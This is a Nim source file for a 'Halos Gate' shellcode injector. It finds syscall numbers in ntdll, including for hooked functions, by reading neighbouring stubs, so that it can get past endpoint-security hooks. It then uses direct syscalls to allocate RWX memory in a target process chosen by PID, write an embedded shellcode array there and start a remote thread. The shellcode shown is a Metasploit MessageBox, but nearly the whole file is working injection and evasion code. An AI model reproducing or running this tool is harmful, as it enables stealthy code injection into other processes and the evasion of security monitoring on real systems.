## thx to https://github.com/zimawhit3/HellsGateNim, used his nim implementation to iterate through the ntdll EAT

include types
import strutils
import os
import strformat

{.passC:"-masm=intel".}

var syscall*  : WORD
type
    HG_TABLE_ENTRY* = object
        pAddress*    : PVOID
        dwHash*      : uint64
        wSysCall*    : WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName : string) : uint64 =

    var hash : uint64 = 0x5381

    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))

    return hash

proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =

    let 
        pImageBase : PVOID              = pCurrentModule.DLLBase
        pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =

    var 
        cx : DWORD = 0
        numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:    
        var 
            pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash        : uint64    = djb2_hash(pFuncName)
            funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:
            tableEntry.pAddress = pFuncAddr

            if cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0x4c and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 1)[] == 0x8b and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 2)[] == 0xd1 and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xb8:  
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
                echo fmt "API NOT HOOKED"
                return true
            else:
                var index : DWORD = 1
                ## Iterate through neighbors
                while true:
                    echo fmt "API IS HOOKED, obtaining value from neighbours"
                    ## Checking values neighbor UP
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + (index  * 32))[] == 0x4c and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 1 + (index * 32))[] == 0x8b and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 2 + (index * 32))[] == 0xd1 and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + (index * 32))[] == 0xb8:  
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (index * 32))[] - cast[WORD](index)
                        return true
                    ## Checking values neighbor DOWN
                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) - (index * 32))[] == 0x4c and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 1 - (index * 32))[] == 0x8b and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 2 - (index * 32))[] == 0xd1 and cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 - (index * 32))[] == 0xb8:  
                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 - (index * 32))[] + cast[WORD](index)
                        return true
        inc cx
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm """
        mov rax, qword ptr gs:[0x60]
        ret
    """

proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
    var 
        currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
        moduleName      : string
        pExportTable    : PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:

        moduleName = $moduleToBuffer(currModule)

        if moduleName.len() == 0 or moduleName in paramStr(0):            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if not getExportTable(currModule, pExportTable):
            echo "[-] Failed to get export table..."
            return false

        if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
            return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
    
    let currentPeb  : PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    """

proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    """
proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    """
when isMainModule:

    if (paramCount() < 1):
        echo fmt"Usage: HalosGate.exe <PID>{'\l'}"
    else:
        when defined(amd64):
            var shellcode: array[295, byte] = [
            byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
            0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
            0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]
            echo fmt"HALOS GATE SHELLCODE INJECTOR{'\l'}{'\l'}"

            var 
                pHandle         : HANDLE            
                allocateHash    : uint64            = djb2_hash("NtAllocateVirtualMemory")
                writeHash       : uint64            = djb2_hash("NtWriteVirtualMemory")
                threadHash      : uint64            = djb2_hash("NtCreateThreadEx")
                allocateTable   : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : allocateHash)
                writeTable      : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : writeHash)
                threadTable     : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : threadHash)
                status          : NTSTATUS          = 0x00000000
                buffer          : PVOID            
                dataSz          : SIZE_T            = cast[SIZE_T](shellcode.len)
                threadHandle    : HANDLE      
            pHandle = OpenProcess(
                PROCESS_ALL_ACCESS, 
                false, 
                cast[DWORD](parseInt(paramStr(1))))
        
            if getSyscall(allocateTable):
            
                syscall = allocateTable.wSysCall
                echo fmt"[*] Calling NtAllocateVirtualMemory"
                echo fmt"OPCODE: 0x{toHex(allocateTable.wSyscall)}"
                status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to allocate memory."
                else:
                    echo fmt"[+] Allocated a page of memory with RWX perms at 0x{toHex(cast[ByteAddress](buffer))}{'\l'}"

            if getSyscall(writeTable):
                syscall = writeTable.wSysCall
                echo fmt"[*] Calling NtWriteVirtualMemory"
                echo fmt"OPCODE: 0x{toHex(writeTable.wSyscall)}"
                var bytesWritten: SIZE_T
                status = NtWriteVirtualMemory(pHandle, buffer, unsafeAddr shellcode, dataSz, addr bytesWritten)
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to write memory."
                else: 
                    echo fmt"[+] Memory written successfully! {'\l'}"

            if getSyscall(threadTable):

                syscall = threadTable.wSysCall
                echo fmt"[*] Calling NtCreateThreadEx"
                echo fmt"OPCODE: 0x{toHex(threadTable.wSyscall)}"
                status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, pHandle, buffer, NULL, FALSE, 0, 0, 0, NULL)
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to start thread."
                else: 
                    echo fmt"[+] Thread created successfully! {'\l'}"
